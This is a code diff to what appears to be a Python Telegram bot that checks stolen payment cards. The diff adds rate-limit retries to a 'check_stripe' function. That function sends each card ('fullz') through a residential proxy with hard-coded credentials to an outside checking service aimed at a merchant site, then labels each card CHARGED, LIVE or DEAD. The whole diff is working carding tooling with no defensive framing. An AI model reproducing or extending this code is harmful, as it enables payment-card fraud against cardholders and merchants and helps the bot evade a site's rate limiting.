@@ -81,28 +81,38 @@ async def get_done(client, msg, total, key, hitsfile, chk_done, charged, live, s
     )
     await msg.reply_document(document=hitsfile, caption=caption, quote=True)
 
-async def check_stripe(card, user_id, session):
-    try:
-        await asyncio.sleep(random.uniform(1, 2))  # ✅ 1–2 second delay
-        params = {
-            "cc": card,
-            "proxy": "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ",
-            "site": "https://www.tekkabazzar.com"
-        }
-        r = await session.get(KILTES_URL, params=params)
-        res = r.json()
-        msg = (res.get("result") or res.get("message") or res.get("error") or str(res)).lower()
+async def check_stripe(card, user_id, session, retries=2):
+    for attempt in range(retries + 1):
+        try:
+            await asyncio.sleep(random.uniform(1, 2))
+            params = {
+                "cc": card,
+                "proxy": "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ",
+                "site": "https://www.tekkabazzar.com"
+            }
+            r = await session.get(KILTES_URL, params=params)
+            res = r.json()
+            msg = (res.get("result") or res.get("message") or res.get("error") or str(res)).lower()
 
-        if any(x in msg for x in ["charged", "payment method added", "thank you"]):
-            return {"hits": "CHARGED", "fullz": card, "response": msg}
-        elif any(x in msg for x in ["insufficient", "zip", "cvc", "avs"]):
-            return {"hits": "LIVE", "fullz": card, "response": msg}
-        elif any(x in msg for x in ["timeout", "rate limit", "proxy error", "connection refused"]):
-            return {"hits": "DEAD", "fullz": card, "response": "Request Timeout"}
-        else:
-            return {"hits": "DEAD", "fullz": card, "response": msg}
-    except Exception as e:
-        return {"hits": "DEAD", "fullz": card, "response": str(e)}
+            if "try again after 120 seconds" in msg:
+                if attempt < retries:
+                    await asyncio.sleep(3)
+                    continue
+                else:
+                    return {"hits": "DEAD", "fullz": card, "response": "Rate limit: Retry failed"}
+
+            if any(x in msg for x in ["charged", "payment method added", "thank you"]):
+                return {"hits": "CHARGED", "fullz": card, "response": msg}
+            elif any(x in msg for x in ["insufficient", "zip", "cvc", "avs"]):
+                return {"hits": "LIVE", "fullz": card, "response": msg}
+            elif any(x in msg for x in ["timeout", "rate limit", "proxy error", "connection refused"]):
+                return {"hits": "DEAD", "fullz": card, "response": "Request Timeout"}
+            else:
+                return {"hits": "DEAD", "fullz": card, "response": msg}
+        except Exception as e:
+            if attempt >= retries:
+                return {"hits": "DEAD", "fullz": card, "response": str(e)}
+            await asyncio.sleep(2)
 
 @Client.on_message(filters.command("stxt", ["/", "."]))
 async def stripe_txt_cmd(client, message):
